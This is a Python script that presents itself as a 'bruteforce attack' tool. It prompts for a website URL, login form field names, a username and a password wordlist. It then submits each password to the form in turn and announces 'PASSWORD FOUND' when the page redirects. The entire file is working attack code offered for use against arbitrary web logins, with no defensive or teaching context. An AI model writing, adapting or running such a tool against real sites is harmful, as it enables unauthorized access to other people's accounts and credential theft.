import mechanize
import requests
import os
import sys
import random


def bruteforce():
    br = mechanize.Browser()

    # br.set_handler_equiv(True)
    # br.set_handler_redirect(True)
    # br.set_handler_referer(True)

    def banner():
        ba = 'WELCOME TO BRUTEFORCE ATTACK'
        print("*" * 50)
        print(ba.center(50, " "))
        print("*" * 50)

    banner()
    url = input("ENTER YOUE WEBADRESS: ")

    ready = br.open(url)
    if ready:
        print("*" * 50)
        print("ATTACKING START ON \t%s" % url)
        print("*" * 50)
        form_field = str(input("TYPE FORM FEILD NAME(if nothing then skip this):"))
        print("-" * 50)
        method = str(input("ENTER FORM METHOD(GET OR POST):"))
        print("-" * 50)
        c_method = method.upper()
        user_field = str(input("ENTER USERNAME FIELD NAME:"))
        print("-" * 50)
        pass_field = str(input("ENTER PASSWORD FIELD NAME:"))
        print("-" * 50)
        username = str(input("TYPE YOUR USERNAME:"))
        print("-" * 50)
        file_i = input("ENTER YOUR FILE LOCATION:")
        print("-" * 50)
        file = open(file_i, 'r')
        # passwords = file.read().splitlines()
        # pass = len(0_9999999999)

        for x in file:
            if form_field == "":
                br.select_form(nr=0)
            else:
                br.select_form(form_field)
            # Default nr=0 for first page no form name
            br.form[user_field] = str(username)
            # username = br.form['name']
            print("TRYING PASSWORD: %s" % x.strip())
            br.form[pass_field] = x.strip()
            # br.form['security']= '192745'
            br.method = c_method
            response = br.submit()
            if response.geturl() != url:
                print("*" * 65)
                print("|\t\t\t""PASSWORD DETAILS""\t\t\t|")
                print("*" * 65)
                print("*" * 100)
                print("!!! PASSWORD FOUND !!!")
                print("USERNAME:" + username)
                print("PASSWORD: %s" % x)
                print("*" * 100)
                quit()

        else:
            print("-" * 65)
            print("PASSWORD NOT IN THIS FILE")
            print("-" * 65)
    else:
        print("BROWSER COULD NOT BE LOADED")
        quit()

